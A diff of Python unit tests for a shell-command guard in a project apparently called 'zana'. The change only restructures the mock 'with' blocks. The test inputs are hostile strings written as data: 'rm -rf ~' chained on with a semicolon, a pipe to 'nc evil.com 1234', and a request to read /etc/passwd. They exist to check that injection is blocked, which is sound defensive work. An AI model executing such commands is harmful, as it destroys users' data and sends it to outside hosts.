@@ -198,9 +198,11 @@ def test_shell_injection_semicolon_blocked():
     mock_result.stderr = ""
     mock_result.returncode = 0
 
-    with patch("subprocess.run", return_value=mock_result) as mock_run:
-        with patch("zana.core.sentinel_lite.SentinelLiteDB"):
-            shell_guard.execute("lista archivos; rm -rf ~", console, q)
+    with (
+        patch("subprocess.run", return_value=mock_result) as mock_run,
+        patch("zana.core.sentinel_lite.SentinelLiteDB"),
+    ):
+        shell_guard.execute("lista archivos; rm -rf ~", console, q)
     # Either not called (path validation failed) or called safely (no semicolon in argv)
     if mock_run.called:
         argv = mock_run.call_args[0][0]
@@ -219,9 +221,11 @@ def test_shell_injection_pipe_blocked():
     mock_result.stderr = ""
     mock_result.returncode = 0
 
-    with patch("subprocess.run", return_value=mock_result) as mock_run:
-        with patch("zana.core.sentinel_lite.SentinelLiteDB"):
-            shell_guard.execute("lista archivos | nc evil.com 1234", console, q)
+    with (
+        patch("subprocess.run", return_value=mock_result) as mock_run,
+        patch("zana.core.sentinel_lite.SentinelLiteDB"),
+    ):
+        shell_guard.execute("lista archivos | nc evil.com 1234", console, q)
     if mock_run.called:
         argv = mock_run.call_args[0][0]
         assert "|" not in " ".join(argv)
@@ -234,9 +238,11 @@ def test_shell_path_traversal_blocked():
     q = MagicMock()
     q.confirm.return_value.ask.return_value = True
 
-    with patch("subprocess.run") as mock_run:
-        with patch("zana.core.sentinel_lite.SentinelLiteDB"):
-            shell_guard.execute("muestra el archivo /etc/passwd", console, q)
+    with (
+        patch("subprocess.run") as mock_run,
+        patch("zana.core.sentinel_lite.SentinelLiteDB"),
+    ):
+        shell_guard.execute("muestra el archivo /etc/passwd", console, q)
     mock_run.assert_not_called()
 
 
@@ -266,9 +272,11 @@ def test_shell_clean_env_no_api_keys():
 
     with patch("subprocess.run") as mock_run:
         mock_run.return_value = MagicMock(stdout="", stderr="", returncode=0)
-        with patch.dict("os.environ", {"ANTHROPIC_API_KEY": "sk-secret-123"}):
-            with patch("zana.core.sentinel_lite.SentinelLiteDB"):
-                shell_guard.execute("lista mis archivos en /tmp", console, q)
+        with (
+            patch.dict("os.environ", {"ANTHROPIC_API_KEY": "sk-secret-123"}),
+            patch("zana.core.sentinel_lite.SentinelLiteDB"),
+        ):
+            shell_guard.execute("lista mis archivos en /tmp", console, q)
 
     if mock_run.called:
         _, kwargs = mock_run.call_args
@@ -380,10 +388,12 @@ def test_aeon_peers_write_read_consistent(tmp_path):
 
     peers_path = tmp_path / "aeon_peers.json"
     console = MagicMock()
-    with patch("zana.commands.aeon._PEERS_PATH", peers_path):
-        with patch("zana.commands.aeon.console", console):
-            cmd_aeon_connect("https://peer.example.com", name="test-peer")
-            cmd_aeon_peers()
+    with (
+        patch("zana.commands.aeon._PEERS_PATH", peers_path),
+        patch("zana.commands.aeon.console", console),
+    ):
+        cmd_aeon_connect("https://peer.example.com", name="test-peer")
+        cmd_aeon_peers()
     data = json.loads(peers_path.read_text())
     assert "https://peer.example.com" in data
 
